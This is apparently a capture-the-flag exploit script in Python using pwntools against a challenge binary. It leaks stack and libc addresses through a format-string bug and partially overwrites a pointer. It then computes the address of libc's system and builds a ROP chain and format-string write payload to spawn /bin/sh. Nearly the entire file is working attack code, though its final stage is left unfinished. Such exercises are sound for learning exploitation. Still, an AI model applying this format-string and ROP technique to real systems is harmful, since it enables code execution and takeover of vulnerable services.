import pwnlib.elf
import pwnlib.rop.rop
import pwnlib.tubes.remote
import pwnlib.context
import pwnlib.fmtstr

pwnlib.context.context.clear(arch='amd64', os='linux')

def read_menu(conn):
    for _ in range(4):
        conn.recvline()

# Read the ELF for RDI register ROP
chall = pwnlib.elf.ELF('apps/chall')
libc = pwnlib.elf.ELF('apps/libc-chall.so')
chall

try_counter = 0
while True:
    try_counter += 1
    print("Try number", try_counter)
    # Connect to remote server and get the main address
    #with pwnlib.tubes.remote.remote('ce441-pwn3.pwni.top', 3137) as r:
    #with pwnlib.tubes.remote.remote('localhost', 3137) as r:
    with pwnlib.tubes.process.process('./apps/chall') as r:
        # Goto edit text
        r.sendline(b'1')
        r.recvline() # welcome text
        read_menu(r) # empty buffer

        # Send payload
        payload = bytearray()
        payload += b'cat /flag ' # what system will run
        # %6$p is the frame pointer of show error
        # %7$p is the return address of show error
        # 7 + 0x120/8 = 43
        # A little adjustments for frame pointer and etc results in
        # %44$p is the frame pointer of stack
        # %45$p is the return to libc
        payload += b'|%6$p| |%7$p| |%44$p| |%45$p| '
        payload += ('a' * (255 - len(payload))).encode('ascii')
        payload += b'\0\x20\x50' # partial overwrite the address to text and hope for the best
        assert len(payload) == 256 + 2
        r.send(payload)

        # Get the result back
        r.recvline() # done
        read_menu(r)
        # Get error message (payloaded!)
        r.sendline(b'4')
        try:
            line = r.recvline()
            if line.startswith(b'> cat /flag '):
                print(line)
                line_split = line.split(b'|')
                return_frame_address = int(line_split[1], 16)
                return_to_main_address = int(line_split[3], 16)
                return_to_libc_address = int(line_split[5], 16)
            else:
                print("Close call:", line)
                continue
        except EOFError:
            continue
    print("Return to main at", hex(return_to_main_address))
    print("Return to libc at", hex(return_to_libc_address))
    # Adjust the offsets
    chall.address = return_to_main_address - (chall.functions['main'].address + 184) # from GDB
    # Tof khales
    # p &__libc_start_call_main - &system = -159840
    # __libc_start_call_main+128 is return_to_libc_address
    # __libc_start_call_main is return_to_libc_address-128
    # __libc_start_call_main - system is -159840
    # return_to_libc_address-128 + 159840 is system
    libc.address += (return_to_libc_address-128+159840) - libc.functions['system'].address
    print("Main at", hex(chall.functions['main'].address))
    print("libc system at", hex(libc.functions['system'].address))

    # Build ROP chain to just move the 
    binsh = next(libc.search(b'/bin/sh\x00'))
    rop = pwnlib.rop.rop.ROP(libc)
    rop.system(binsh)
    print(rop.dump())
    print(len(bytes(rop)), bytes(rop))

    # Build the payload to change the buffer
    writes = {
        return_frame_address: bytes(rop),
    }
    payload = pwnlib.fmtstr.fmtstr_payload(1, writes)
    print(payload)
    print(len(payload))
    # Change the buffer again
    payload = bytearray()
    payload += b'cat /flag ' # what system will run

    exit()